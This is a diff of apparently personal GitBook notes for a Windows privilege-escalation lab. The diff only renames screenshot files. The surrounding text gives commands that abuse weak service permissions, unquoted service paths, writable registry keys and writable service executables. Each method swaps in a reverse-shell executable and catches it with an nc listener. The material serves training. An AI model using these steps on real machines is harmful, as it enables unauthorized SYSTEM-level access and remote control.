@@ -28,7 +28,7 @@ Use accesschk.exe to check the "user" account's permissions on the "daclsvc" ser
 
 `C:\PrivEsc\accesschk.exe /accepteula -uwcqve user daclsvc`
 
-<figure><img src=".gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
 It shows the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).
 
@@ -36,11 +36,11 @@ Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_
 
 `sc qc daclsvc`
 
-<figure><img src=".gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
 Checking if the service is running or stopped currently `sc query daclsvc`&#x20;
 
-<figure><img src=".gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 We can modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable:
 
@@ -50,7 +50,7 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 `net start daclsvc`
 
-<figure><img src=".gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
 ### 2 - Unquoted Service Paths
 
@@ -58,13 +58,13 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 Using `winPEASany.exe quite servicesinfo` - we see an "unquotedsvc" service, lets take a look at it with `sc qc unquotedsvc`&#x20;
 
-<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
 #### A - Let's check if we have "read/write" access to the path.
 
 `.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"` - we have "RW" access, meaning we can replace the default service exe with our custom rev shell exe.
 
-<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
 #### B - Lets check if we have permission to start and stop the  service.
 
@@ -78,11 +78,11 @@ Copy the reverse.exe payload to the file path.
 
 `copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"` - copy and replace it with "common.exe"
 
-<figure><img src=".gitbook/assets/image (17) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (17) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 Start nc listener and start the service -> `net start unquotedsvc` .
 
-<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (18) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
 ### 3 - Service Exploits - Weak Registry Permissions
 
@@ -92,21 +92,21 @@ The Windows registry stores entries for each service. Since registry entries can
 
 Run "winPEASany.exe" and check the reqistry session.
 
-<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (19) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption><p>2</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (21) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
 Lets check if we have access to the dir where the file is located:
 
 `.\accesschk.exe /accepteula -dvwq "C:\Program Files\Insecure Registry Service"` - but as we see in image 3 below, we don't have permission to write to that dir.
 
-<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption><p>3</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (22) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 Using accesschk.exe, we see that the registry entry for the "regsvc" service is writable by the "NT AUTHORITY\INTERACTIVE" group (meaning all logged-on users):
 
 `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc` .
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption><p>4</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (20) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
 Now we have to modify the registry path to our rev shell location.
 
@@ -114,7 +114,7 @@ Overwriting the ImagePath registry key to point to the reverse.exe executable we
 
 `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
 
-<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>5</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (23) (1).png" alt=""><figcaption><p>5</p></figcaption></figure>
 
 Start nc and catch the connection.
 
@@ -130,13 +130,13 @@ We see a "filepermservice.exe" that "Everyone" has "AllAccess", lets confirm thi
 
 `.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` - and "BUILTIN\Users" has "RW" access.
 
-<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption><p>2 - users has RW access</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (24) (1).png" alt=""><figcaption><p>2 - users has RW access</p></figcaption></figure>
 
 We can also see that whe we execute the file, we will get Local System privs.
 
 `sc qc filepermsvc`&#x20;
 
-<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption><p>3 - we'd get Local System on execution</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (25) (1).png" alt=""><figcaption><p>3 - we'd get Local System on execution</p></figcaption></figure>
 
 `copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y` -
 
